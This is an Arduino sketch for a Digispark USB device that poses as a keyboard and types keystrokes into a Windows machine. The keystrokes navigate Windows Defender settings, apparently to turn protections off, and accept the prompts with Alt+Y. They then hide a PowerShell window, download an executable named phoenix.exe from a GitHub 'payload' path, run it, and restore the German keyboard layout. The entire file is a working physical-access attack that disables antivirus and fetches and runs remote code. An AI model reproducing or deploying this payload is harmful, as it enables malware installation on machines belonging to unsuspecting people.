#include "DigiKeyboard_new.h"

void setup() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Windows Defender Settings");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3250);
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, 5000);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/Phoenixthrush/phoenixthrush.github.io/master/payload/phoenix.exe\" , \"$ENV:UserProfile\\Downloads\\phoenix.exe\")");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("%userprofile%\\Downloads\\phoenix.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd /k \"powershell -command Set-WinUserLanguageList -Force de-DE\" && exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {

  DigiKeyboard.delay(250);
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(250);
  digitalWrite(0, LOW);
  digitalWrite(1, LOW);

}
